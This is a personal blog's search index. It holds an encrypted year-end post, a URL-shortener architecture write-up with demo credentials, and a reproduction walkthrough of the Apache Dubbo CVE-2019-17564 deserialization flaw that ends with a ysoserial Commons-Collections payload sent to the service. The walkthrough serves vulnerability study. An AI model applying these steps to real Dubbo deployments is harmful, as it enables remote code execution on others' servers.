<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2021年的总结</title>
    <url>/2021/11/15/2021%E5%B9%B4%E7%9A%84%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="efacb27086f9fb7872b9027510e3afb3c93c43d1408e22998919b63ad391fbff">05c681a07e0f39bb24b350122b910aef56361e6cd1e45a4e392261b953ea978551728d167bf7678305bc5a122f31f8b3cfb7b07ee552d9a46822824f756d7f92741f478e320521a9d11ce2f2772191d146f7057084f8660277faa2092130e2cedc2b983dfb29fdbe742cd39509c88965be08039883cfe9936654ecf24dcb5fcc394fd9cbf6f8134bb85013ceb583a234333fe36a2fb62bf1ac8af0d5fcd7974871eaac7fb096f001056f49e7ae6cf07031f18b3c5eed90d4d59ecfa38cdb0999d1eb3f784cdd61cfa19a6e533d24e3c9749a47be77c28c11976a00f058cfb9bb8559bb4b2d24f87a814e35c0e318c9d85d24ad4e2820245de5151b778faac697e1aad03ab8cf823211057d54fd7464a0a63765a9bce3dfc3f74ceaf965e69cd9835876820d5d69cbf46d5d894090e6f8b9c27241dbb2769e223040b04f1a17a3a4f5896e19604d6eb2c56d382f2942e83448584b0c3df309decd8bc0f09f1c0c0066393bfb077b90457a66bf087cc6574981c2a61dad72b793bcc3993a7d6a7f72fb0c399a49a3e2d2ae35cf1699aa3cc6e5b5cded97f3a5679cc60487c605f0a05c46a22834f9f19152f057206057d96bb23100c0729cf4b3f5f15d9ff8475eeb5d1e33623b4405182b5fd669f6a93ecf429cf69e781855adae31be0499f31baa6171fa5b0b55ed910971f472e61470eae1fb59201853d3ef005fda27243e7cf39a01c559d613a7edbc8345708defe4dfd951f8084c4995e9dbe877e46d9f46de72eae771f4e97e3258f758911f35e014e29c91f26c6b4825d255769e6397f5035b95e49a3f77ed025f0a236852821f25133ba6800fbd337baac494acf0ea37d587e1d9dd5151b6ec39737366fa2451c4e47cb2dc0780a5921f0b8830c45fd5c3039d5d27cfb4c83ade59aa4f1175a831d4b12746b7bdcab40f889df54e6e93e11e4df7bd15e43aee363a115464ff30a745ca810c594b9088d10bf08c7816cd355b7503878a0e10b5462c72e702f31a3b15b8a70ba19b43ba0c465a51a7c7760db418492db2ca75fd2d3e5ea847f620360b8c6267cda8f5129912889c30873c21f2ec9038cae3631167c9bcada0899c536d24e99ddbd1b64370e14de88e92be02d0e6b9581d7a7429142dffbe41420d2fbcb81c31e8c1e717eee3f638fc1d52d16d44d2e4fd28a993cfb66d23a2025d9076603d0e5607b812474af12665d0676f988f42273d670e380c5fac435520a1d67977257287b92dc07223cddd7ad3ba55b79776434a81bc1e900fe05e2c3c57396045c69830aeb5fc98d5db39564981209f835aa366e93f6f4d871fd4ca19deefac2bc1ab39d731648bc05b155db4d5c9fecfbd0535d87df5cb38762eaa47bdf9f76164fc962f2baa04333910fcc86eb3237bff5ac802419e7b4aa3e64792d99ae35af5892d4860fe733297c3e51b33ffa30a663281b0cd5224c2b27aa936e0813e8139f3076407b146e4a4d106fe8157319c99e19c830b44d7169261bd13b3678773bb4f9012ea8af50678c11796159fa05f83e20f60f1af99577445c63eae18dcee39745ce6963c41362712bfb6173fd6b14271c1bd83f8ddd7e567a1164bee645d553c5dfcf18831e61cf90ad353e987c3b3a031a091acf0d84235c161797f191afe6fd695066820853aba457cefba72a7f97a7a894b6cd232b7376321755250d65f2304e60cffa77c779ad1d5de45f4d7b2b67ece8f20a333dc5c45418d3ed613585523aad355214e0d8e5717f6a0694e2d30314104500827fdeaf812556248ee1f28d7fcd1ff63024c5ca491b1a2119b856de19ddfa0c943505ecb8bff47e38d85e287699698148a14e8b5a0ad5aa773df069bf164ff7205dd78bfc3900ddadcebfa6e0b40a7ece8953f1891c4c5fadeb49a9711d6bf4c58cb96568e5503c1c29a7db5e5951d1bf3dc2d15aa0953b24b34a56136aded857577dd1c800dbcbb98cb110329d555d3760098aa446e5399a788902c76adb4f18d3db62f0c91bcec430256e8011e1f831066c6850dd31b4f6c5b1aca386c8f51031da697320724e68bc0d60010cd553f2542e77f63807f766d71dceef17fb470868fc70900e47e6ab0825307458612dddf7c9efb3dcc3a685b8f184fefb033a25ec7f3450f53a7d28582f4476d51759b676ddbb3a863d6bdc269d67452e5715c7a04723915e99cfd9365f42558be4ddc6694a25036d0238d621d7deb3ca0dbe49b4d495abfb75818c70feed8b6abd23bcc04bcb696fae5dcec6eacb3450cf1c9167dea72db60ed17ff6fd1fe5e5d2dce6057fb5f20f25c1ef139ef83640a0266040424ca33c2993fd9b5a4e483a233260f27222e129a3615d7bb1f88453a1cc0c6b42f62dff299be2b57fc9bbba79536381147398319a7de89c7ed14eb317bf5eab3fbabdeaef6d16da5260259eec6a93d7662658f5d6689238a8df600b6bf95cbdaacb8c3154eb391742f6a7d8665af78f79af91b59e4d84ba444638249e28b5403d80cc955f76ebe9606960c68968450f4c7e69bf722593b4b5cffc04ed973a10d0d9ab24fd2fb82c1ece9de23b6b367035bbd1d8a2110959afcba09e8ed8229670bdb7c9a3056c92733e8f53db34327536970f926264e18c8488f93ef7ce000b3f2cfac9989770a07c40dbaee8e60dd26c28605e4bc962b3c2c095f6c669290e4e0a080c94cf20c305bc1c216336b4ca7b6d33fc9d24e66bb2b313eb1dddfd14be7fd3b2129521ef9b356d238466f4f9740e05ec193a8d369696baa608cc1cc2e11c0b6d30f9e4abf6ab4f9edfbd8a29a65aa2345bbe5204145601f02a096607ddd51063dc534d00dd1ff0186e1d682f6fe1b5747e78c9786fe03a0e705a8babe6760e45f16dcd3558c2c23169dff0fb531689dd7185aa957296fcfa2b0bed71b61e7df40bf1862aec3b6776363833c186b82c5d0782a9fa8d0f34da9bc1203a223ceb6ba4e9ed12638ea3c0290b84f8e7df81f1c2714559f669a16976609c99cadfc815f59d88711d8d79c3cb5831444afed68c4bb54337cfb95e47966646d4a855a6c7973be31d7005921f89ad9b9fc446f7ea802d142b3c9bae6ca036bb0f5bb729a6782084f3e91a80a766623cc62f20264ec3d4b1ea89d9db9d3db1f142f861672eee8b87152bac528e1a9b619dc9a209aff2613b0f1c96f33d8d714b107fde85fbe6753aa1d3722363696042a401a5398e5e8e3b9bf44812736c56c215b668c816fcaaea9daa1f7d14e4be25a7ed9a50daebe4a0d3e9036f486faed67e5b89376611fc9cc5a1bc75d9fde5da16090355921bec55a5f58878a003357b4cf183b616e4ca6785c2b77e74df8219e6875552478a4aa9a150ebab1ccf7e3901e69b912c3e3109b69c94fecd5e62acddc56cd92611eff329b927bf681c7e9db4c13643b990ca04ca1250e596950e40b35363351281f7d786a31d2adc1a0570598a80ff1d9afda79ce37d69c5141344768fdffc59af77318c366911aab9ef8dd69db84f495935c510bfbfa941312bca571b94e79feda8435d05d8e4cc9aee95197d6377732a9b8532950c60b919f6c0eab1bdac6b4336f1cc6deaedd7e42648aad3edbb1935a6f859a358c227079cec0afc8a66b2f880959f08211a767eb8b033ce7d60a94dd5eec65627b4d5aae2fbcc1a1fbbd8abf6b37a9bf941741de71111704c658d3a1f019228bbec8f7c1c1ef5118c8d47dfdec854920a8a272e848a45bf30de79f5d40a7134ec9c44470b61450bcf6249ed4283eb73d6ed04caadd714d3d0249e85a53167ea138c7a9bafa58305f759daa9d4fd851317006470d8c5d8e1fa4e62c4e84145d77250fb77a5a396a2e9a19f183a012ad80fcf50e5a5fba7b3dc7aaab8d96cdf0c309fd30d15b07fd69df24cd9f41d289a25d3fa23cace7ed8a5660a1c1c26f2b42c09bfd09f6443c40fb7866e2bd4498a28edaa5e390dc3b35ca1cfc333cfd8d8a358866b216226f2a77495cfc827cd86d4cc0b9a720d849ded1ccbe993f76663f87aa4d05134b4162c03a4502902b4f89d730e7f9256fcb1a73584a7eda6bca4515ea668844f4a746fbeccf260135b30dde0faaded50927493161afec4760072f6c9b630f629f890fe8752568ff679409a50c91047b86664c73732086cf5063587de261b21d6d8d3e67a92c4165f69b786d152d0222e6ed646d8726ff7210a6661b116080552ef8835e5234fcbebe0f9facd7162d12064c941aeae6be16882b9013e8b5a95042bfc333e368d66b0b21bd4a840df9ac38c6e8f3876ae89ea6ddc1c89ebfed8f63172abbb301bf08f73585e930cc392c0d5c65b3002e</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Others</category>
      </categories>
      <tags>
        <tag>Summary</tag>
      </tags>
  </entry>
  <entry>
    <title>Amazing URL Shortener - Technical Doc</title>
    <url>/2022/12/04/Amazing-URL-Shortener-Technical-Doc/</url>
    <content><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Amazing URL Shortener is an online tool with high availability to shorten a long link and provide detailed statistics.</p>
<p><strong>Demo</strong>:</p>
<ul>
<li><a href="http://official.urls.fit/">http://official.urls.fit</a></li>
<li><a href="http://short.urls.fit/">http://short.urls.fit</a></li>
</ul>
<p><code>username: test</code></p>
<p><code>password: test</code></p>
<p><strong>Short link demo</strong>: <code>urls.fit/a26B4EM0</code></p>
<p><strong>GitHub repo:</strong> </p>
<ul>
<li>Backend: <a href="https://github.com/leihehehe/java-url-shortener">https://github.com/leihehehe/java-url-shortener</a></li>
<li>Frontend: currently is a private repo</li>
</ul>
<span id="more"></span>

<h1 id="Technical-Stacks-Used"><a href="#Technical-Stacks-Used" class="headerlink" title="Technical Stacks Used"></a>Technical Stacks Used</h1><p><strong>Backend Techniques:</strong> </p>
<ul>
<li><p><strong>Framework</strong>: SpringBoot, Spring Cloud</p>
</li>
<li><p><strong>Gateway</strong>: Spring Cloud Gateway</p>
</li>
<li><p><strong>Message Queues</strong>: RabbitMQ, Kafka</p>
</li>
<li><p><strong>Database-related Techs</strong>: Redis, Redisson(operating on Redis), ClickHouse, SpringData JPA, MySQL,  Apache Shardingsphere</p>
</li>
<li><p><strong>Data Streaming-processing Framework</strong>: Flink</p>
</li>
<li><p><strong>Availability</strong>: resillience4j</p>
</li>
<li><p><strong>Others</strong>: Openfeign, etc.</p>
</li>
</ul>
<p><strong>Frontend:</strong> Angular.js</p>
<p><strong>DevOps</strong>:</p>
<ul>
<li>Jenkins</li>
<li>Kubernetes</li>
</ul>
<h2 id="ShardingSphere"><a href="#ShardingSphere" class="headerlink" title="ShardingSphere"></a>ShardingSphere</h2><blockquote>
<p><strong>ShardingSphere</strong> provides a distributed database solution based on the underlying database, which can scale computing and storage horizontally</p>
</blockquote>
<h3 id="Why-use-it"><a href="#Why-use-it" class="headerlink" title="Why use it?"></a>Why use it?</h3><p>Since we are developing a system that can handle massive data, it is not possible to just use one single database or a few tables to store the data. Storing massive data in only one node or database will cause much pressure on the database itself, and speed will be significantly slowed down.</p>
<p>Therefore, it is necessary to do sharding and partitioning. For example, I divided the <code>product_order</code> table into two tables stored in the <code>url_shop</code> database and divided the <code>short_link</code> table into 6 tables and every two tables are distributed in a <code>url_link</code> table. (For more details, please see the <strong>Database Structure</strong> part)</p>
<h3 id="Partition-Keys"><a href="#Partition-Keys" class="headerlink" title="Partition Keys"></a>Partition Keys</h3><p>Partition keys are set in terms of different cases. For example, for users to find their orders quickly, <code>accountNo</code> is used as a partition key, so that a user’s orders will be in the same table.</p>
<p>Another situation is that we need to handle a large number of shortened links across multiple databases and tables. In this case, I use <code>accountNo</code> as a partition key to finding out which <strong>databases</strong> the records are currently in. Besides, <code>groupId</code> is used as a partition key for finding out which <strong>tables</strong> the records are currently in.</p>
<h3 id="How-to-query-the-data-in-this-case"><a href="#How-to-query-the-data-in-this-case" class="headerlink" title="How to query the data in this case?"></a>How to query the data in this case?</h3><p>I used two methods to query the data</p>
<ul>
<li><strong>Modulo</strong>. For example, <code>k = accountNo mod n</code> where n is the number of tables that will query the <strong>kth</strong> table </li>
<li><strong>Store database and column info in the data itself</strong>. For example, we got a short link code stored in the database <code>a</code> and table <code>2</code>, then we can update the short link code to <code>axxxx2</code>, so that we could quickly locate this short link when querying the data.</li>
</ul>
<h2 id="Redis-Redisson-amp-Lua-Script"><a href="#Redis-Redisson-amp-Lua-Script" class="headerlink" title="Redis, Redisson &amp; Lua Script"></a>Redis, Redisson &amp; Lua Script</h2><ul>
<li>Redis is used as a cache in the project. It stores the users’ plan data information to prevent frequent requests to the MySQL database.</li>
<li>Redis and Redisson are used together to handle distributed locks. In addition to using Redisson, Lua script is also straightforward and used for creating locks.</li>
</ul>
<h2 id="RabbitMQ"><a href="#RabbitMQ" class="headerlink" title="RabbitMQ"></a>RabbitMQ</h2><ul>
<li>RabbitMQ is used to slow down the response waiting time as operations can be asynchronously executed by sending messages.</li>
<li>RabbitMQ is also used to deliver delayed messages for different purposes like order cancellation and distributed transactions.</li>
<li>Compared to <code>Kafka</code>, it is more suitable for an e-commerce business service(e.g. scheduled tasks and distributed transaction management) </li>
</ul>
<h2 id="Flink-Kafka-amp-ClickHouse"><a href="#Flink-Kafka-amp-ClickHouse" class="headerlink" title="Flink, Kafka &amp; ClickHouse"></a>Flink, Kafka &amp; ClickHouse</h2><blockquote>
<p><strong>Flink is used for processing data streams at a large scale and to deliver real-time analytical insights about your processed data with your streaming application</strong>.</p>
</blockquote>
<p>In this project, I used <code>Flink</code> to get visitor information when a visitor is trying to access a shortened link. Flink helps to process the visitor information in each layer and pass the processed information to the next layer using <code>Kafka</code>.</p>
<p>At the last layer, I used Flink to pass the final datasets to ClickHouse which is a fast column-oriented database management system.</p>
<p>ClickHouse allows us to generate analytical reports using SQL queries.</p>
<h2 id="Jenkins-amp-Kubernetes-High-Availability"><a href="#Jenkins-amp-Kubernetes-High-Availability" class="headerlink" title="Jenkins &amp; Kubernetes(High Availability)"></a>Jenkins &amp; Kubernetes(High Availability)</h2><p>The Jenkins file is included in the project, and both front-end and back-end projects are deployed using Kubernetes and Jenkins.</p>
<p>Jenkins runs a piepeline to build and upload images to AWS ECR.</p>
<p>Using <strong>3</strong> servers(<strong>1 master node and 1 worker node</strong>) to build a Kubernetes cluster. </p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/202212042225127.png" alt="kubernetes deployments"></p>
<h1 id="Technical-Difficulties-amp-Solutions"><a href="#Technical-Difficulties-amp-Solutions" class="headerlink" title="Technical Difficulties &amp; Solutions"></a>Technical Difficulties &amp; Solutions</h1><h2 id="User-and-Visitors-Querying-Links"><a href="#User-and-Visitors-Querying-Links" class="headerlink" title="User and Visitors Querying Links"></a>User and Visitors Querying Links</h2><p>As we know users prefer to query links in terms of their <code>accountNo</code>, if the links are distributed in different databases and tables, it will be very difficult for users to query the data since the system needs to access all the databases and tables to get the records.</p>
<p>However, visitors, just need the <strong>short link code</strong> to locate the table, and they have no idea about the <code>groupId</code> and <code>accountNo</code>.</p>
<p>So apparently, we would have two different partition keys to deal with these two cases.</p>
<p>Therefore, I duplicated the tables so that tables <code>group_link_mapping</code> are used to store data for users, <code>short_link</code> tables are used to store data for visitors.</p>
<h2 id="Distributed-Transaction-Management"><a href="#Distributed-Transaction-Management" class="headerlink" title="Distributed Transaction Management"></a>Distributed Transaction Management</h2><p>New issues have arisen after duplicating the short link tables. Since tables need to be synchronized, there will be inconsistent data if the operation on the user side failed but succeed on the visitor side.</p>
<p><strong>Solution</strong>: Use <code>RabbitMQ</code> to send a <strong>delayed message</strong> to check if operations on both sides are successful.</p>
<h2 id="Two-Users-Creating-the-Same-Short-Link"><a href="#Two-Users-Creating-the-Same-Short-Link" class="headerlink" title="Two Users Creating the Same Short Link"></a>Two Users Creating the Same Short Link</h2><p>If two users are generating the same short link, <strong>user A</strong> has inserted data to <code>group_link_mapping</code> and <strong>user B</strong> has inserted data into <code>short_link</code>, at this time, both users will fail because they cannot insert data into others tables(data already exists).</p>
<p><strong>Solution</strong>: Use <code>Redis</code> to add a lock. The value stored in the Redis will be <code>accountNo</code>, if <code>accountNo</code> in the Redis matches the current logged-in <code>accountNo</code>, continue the operations. Otherwise, stop the operations(another user is holding the lock).</p>
<h2 id="Nginx-Short-Link-Access-and-API-server"><a href="#Nginx-Short-Link-Access-and-API-server" class="headerlink" title="Nginx - Short Link Access and API server"></a>Nginx - Short Link Access and API server</h2><p><strong>Updates</strong>: </p>
<p>I have changed the Load balancer to Nginx. Using Nginx can help us load balance and proxy traffic to bankend servers. It significantly saves the overhead of using the AWS load balancer.</p>
<hr>
<p><del>I used the <strong>Load Balancer</strong> in AWS to forward different requests with different URLs and the specific port (80). Basically, we will have two different domains for websites and shorten urls.</del></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20230406225347.png"></p>
<h2 id="Eureka-Servers"><a href="#Eureka-Servers" class="headerlink" title="Eureka Servers"></a>Eureka Servers</h2><p>I did not deploy Eureka servers to Kubernetes. Instead, I deployed them to another machine and used Docker network functions to enable communication between them.</p>
<h1 id="Database-Structure-ER-Diagram"><a href="#Database-Structure-ER-Diagram" class="headerlink" title="Database Structure (ER Diagram)"></a>Database Structure (ER Diagram)</h1><p><strong>url_shop</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20221129155609.png"></p>
<p><strong>url_link_0</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20221129155800.png"></p>
<p><strong>url_link_1</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20221129155832.png"></p>
<p><strong>url_link_a</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20221129155900.png"></p>
<p><strong>url_shop</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221129155931898.png"></p>
]]></content>
      <categories>
        <category>Development</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java Project</tag>
        <tag>URL shortener</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Dubbo系列漏洞分析</title>
    <url>/2022/01/23/Apache-Dubbo%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>此篇文章将分析apache dubbo系列漏洞，在复现的时候花了些时间，因为国内好多文章都是照搬，这里将自己的复现过程全部写出来，也是为以后避坑。</p>
<h1 id="什么是RPC"><a href="#什么是RPC" class="headerlink" title="什么是RPC"></a>什么是RPC</h1><p>RPC全称为Remote Procedure Calls，翻译为远程过程调用，常用于分布式。</p>
<p>关于RPC和RMI的区别：</p>
<blockquote>
<p>*<strong>Remote Procedure Call (RPC)*</strong> is a inter process communication which allows calling a function in another process residing in local or remote machine.</p>
<p>*<strong>Remote method invocation (RMI)*</strong> is an API, which implements RPC in java with support of object oriented paradigms.</p>
<ol>
<li>You can think of invoking RPC is like calling a C procedure. RPC supports primitive data types where as RMI support method parameters/return types as java objects.</li>
<li>RMI is easy to program unlike RPC. You can think your business logic in terms of objects instead of a sequence of primitive data types.</li>
<li>RPC is language neutral unlike RMI, which is limited to java</li>
<li>RMI is little bit slower to RPC</li>
</ol>
</blockquote>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/08212f29-d32a-4b01-8ca9-a3b1945f11de.png" alt="img"></p>
<h1 id="Apache-Dubbo-Introduction"><a href="#Apache-Dubbo-Introduction" class="headerlink" title="Apache Dubbo Introduction"></a>Apache Dubbo Introduction</h1><p>Apache Dubbo是开源的Alibaba RPC和微服务框架，其包含以下组成：</p>
<ul>
<li>Provider</li>
<li>Container</li>
<li>Consumer</li>
<li>Registry - 分布式中的注册中心，返回list of <strong>providers</strong> to a <strong>consumer</strong></li>
<li>Monitor</li>
</ul>
<h1 id="CVE-2019-17564"><a href="#CVE-2019-17564" class="headerlink" title="CVE 2019-17564"></a>CVE 2019-17564</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
<li>2.7.0 &lt;= Apache Dubbo &lt;= 2.7.4</li>
<li>2.6.0 &lt;= Apache Dubbo &lt;= 2.6.7</li>
<li>Apache Dubbo = 2.5.x</li>
<li>Zookeeper</li>
</ul>
<ol>
<li>下载好Apache Dubbo后用intellij打开http module</li>
</ol>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220209142533883.png" alt="image-20220209142533883"></p>
<p><strong>http-provider.xml</strong>中修改端口号，zookeeper会占用8080端口</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220209143024881.png" alt="image-20220209143024881"></p>
<p><strong>pom.xml</strong>中修改dubbo version为2.7.3</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220209143323692.png" alt="image-20220209143323692"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220209143334541.png" alt="image-20220209143334541"></p>
<p>在dependencies中也需要添加version，否则会失效(这里卡了很久)。</p>
<h3 id="Zookeeper"><a href="#Zookeeper" class="headerlink" title="Zookeeper"></a>Zookeeper</h3><p>下载好zookeeper，在conf中新建一个zoo.cfg，并将zoo_sample.cfg的内容复制到zoo.cfg中，可以自行修改配置</p>
<p>然后运行<code>bin\zkServer.cmd</code></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>运行HttpConsumer之后，发现实际上访问了<img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220209163525769.png" alt="image-20220209163525769"></p>
<p>我们使用postman来验证一下：</p>
<p>用debug模式运行httpProvider，再使用postman发送get请求</p>
<p><code>http://127.0.0.1:8081/org.apache.dubbo.samples.http.api.DemoService</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220209163631458.png" alt="image-20220209163631458"></p>
<p>发现请求发出后，会被断在DispatcherServlet#service处</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220209163709134.png" alt="image-20220209163709134"></p>
<p>根据servlet相关知识我们知道，请求会被分类封装(如get请求、post请求)，然后被发给指定的servlet</p>
<p>我们继续跟进handle方法</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220209163850376.png" alt="image-20220209163850376"></p>
<p>可以发现会检测到request的请求方法，如果是get，则返回500错误。因此我们需要尝试将其改为post</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220209163937359.png" alt="image-20220209163937359"></p>
<p>请求发送后再次断在刚才的地方</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220209164014482.png" alt="image-20220209164014482"></p>
<p>继续跟进</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleRequest</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//在此处F7跟进，看他是如何read Remote Invocation的</span></span><br><span class="line">        <span class="type">RemoteInvocation</span> <span class="variable">invocation</span> <span class="operator">=</span> <span class="built_in">this</span>.readRemoteInvocation(request);</span><br><span class="line">        <span class="type">RemoteInvocationResult</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.invokeAndCreateResult(invocation, <span class="built_in">this</span>.getProxy());</span><br><span class="line">        <span class="built_in">this</span>.writeRemoteInvocationResult(request, response, result);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException var5) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NestedServletException</span>(<span class="string">&quot;Class not found during deserialization&quot;</span>, var5);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> RemoteInvocation <span class="title function_">readRemoteInvocation</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.readRemoteInvocation(request, request.getInputStream());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续跟进</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> RemoteInvocation <span class="title function_">readRemoteInvocation</span><span class="params">(HttpServletRequest request, InputStream is)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">//此处会获取输入流，往下跟后发现抛出了异常</span></span><br><span class="line">    <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="built_in">this</span>.createObjectInputStream(<span class="built_in">this</span>.decorateInputStream(request, is));</span><br><span class="line"></span><br><span class="line">    RemoteInvocation var4;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//此处read Remote Invocation</span></span><br><span class="line">        var4 = <span class="built_in">this</span>.doReadRemoteInvocation(ois);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> var4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220209164418884.png" alt="image-20220209164418884"></p>
<p>下面的<code>this.doReadRemoteInvocation(ois);</code>并未被执行，为什么呢？</p>
<p>因为我们并未在post请求体中放入数据，无法获取到输入流</p>
<p>看看doReadRemoteInvocation方法</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220209165553503.png" alt="image-20220209165553503"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> RemoteInvocation <span class="title function_">doReadRemoteInvocation</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">//反序列化触发</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">    <span class="keyword">if</span> (!(obj <span class="keyword">instanceof</span> RemoteInvocation)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RemoteException</span>(<span class="string">&quot;Deserialized object needs to be assignable to type [&quot;</span> + RemoteInvocation.class.getName() + <span class="string">&quot;]: &quot;</span> + ClassUtils.getDescriptiveType(obj));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (RemoteInvocation)obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>在pom.xml中添加</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>重新运行HttpProvider</p>
<p>使用ysoserial生成cc4 payload</p>
<p>使用postman：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220209165848037.png" alt="image-20220209165848037"></p>
<p>发送请求后成功弹出计算器：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220209165906408.png" alt="image-20220209165906408"></p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://stackoverflow.com/questions/2728495/what-is-the-difference-between-java-rmi-and-rpc">https://stackoverflow.com/questions/2728495/what-is-the-difference-between-java-rmi-and-rpc</a></p>
<p><a href="https://itzone.com.vn/en/article/an-introduction-to-apache-dubbo-and-cve-2019-17564-analysis/">https://itzone.com.vn/en/article/an-introduction-to-apache-dubbo-and-cve-2019-17564-analysis/</a></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Apache</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Vulnerability Exploitation</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache HTTPD 漏洞复现系列</title>
    <url>/2021/09/04/Apache-HTTPD%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本章总结了一系列的Apache相关的漏洞，从漏洞形成到漏洞触发到漏洞总结。</p>
